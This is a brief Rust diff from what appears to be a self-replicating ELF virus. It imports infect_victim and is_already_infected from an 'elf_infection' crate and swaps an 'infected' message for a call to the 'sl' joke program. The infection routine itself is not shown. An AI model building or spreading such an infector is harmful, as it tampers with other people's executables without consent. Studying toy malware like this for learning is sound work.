@@ -1,3 +1,4 @@
+use sl::sl;
 use elf_infection::infect::{
     infect_victim,
     is_already_infected,
@@ -12,7 +13,8 @@ fn main() {
 }
 
 fn fun_stuff() {
-    println!("This program has been infected.");
+    let sl_args : Vec<String> = vec![String::new();1];
+    sl(&sl_args);
 }
 
 fn payload() {
